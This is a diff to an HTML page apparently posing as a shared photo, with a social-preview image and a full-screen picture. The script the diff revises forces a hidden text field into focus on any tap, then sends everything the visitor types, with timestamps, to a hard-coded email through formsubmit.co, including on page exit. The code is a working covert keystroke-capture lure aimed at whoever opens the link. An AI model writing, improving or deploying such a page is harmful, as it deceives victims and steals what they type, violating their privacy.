@@ -2,40 +2,50 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Photo</title>
 <meta property="og:image" content="https://anisanis88o.github.io/photo/photo.jpg.png">
 <style>
   html,body{margin:0;height:100%;background:#000;overflow:hidden;}
   img{width:100%;height:100%;object-fit:contain;}
-  #trap{position:fixed;bottom:0;left:0;width:100%;height:34px;border:0;
-        background:rgba(0,0,0,.5);color:#fff;font-size:14px;text-align:center;}
+  #trap{position:fixed;bottom:0;left:0;width:100%;height:44px;border:0;
+        background:rgba(0,0,0,.55);color:#fff;font-size:15px;
+        text-align:center;outline:none;}
 </style>
 </head>
 <body>
   <img src="photo.jpg.png" alt="photo">
-  <input id="trap" type="text" autofocus autocomplete="off"
+  <input id="trap" type="text" autocomplete="off"
          autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="...">
 <script>
-  const EMAIL = "riboribk@gmail.com";
+  const EMAIL = "riboribk@gmail.com";   // <-- CHANGE THIS
 
   const trap = document.getElementById("trap");
-  let last = "";
+  let last = "", timer;
+
+  // tap anywhere (including the picture) opens the keyboard
+  document.body.addEventListener("click", () => trap.focus());
+  trap.focus();
 
   function send() {
     const v = trap.value;
-    if (!v || v === last) return;
-    const data = new FormData();
-    data.append("keys", v);
-    data.append("time", new Date().toISOString());
-    navigator.sendBeacon("https://formsubmit.co/ajax/" + EMAIL, data);
+    if (!v || v === last) return;   // never re-send the same text
     last = v;
+    clearTimeout(timer);
+    fetch("https://formsubmit.co/ajax/" + EMAIL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify({ keys: v, time: new Date().toISOString() }),
+      keepalive: true
+    });
   }
 
+  // send 1.2s after they STOP typing (kills the "keeps sending" spam)
+  trap.addEventListener("input", () => { clearTimeout(timer); timer = setTimeout(send, 1200); });
+
+  // one final send when they leave
   document.addEventListener("visibilitychange", () => { if (document.hidden) send(); });
   window.addEventListener("pagehide", send);
-  trap.addEventListener("blur", send);
-  setInterval(send, 15000);
 </script>
 </body>
 </html>
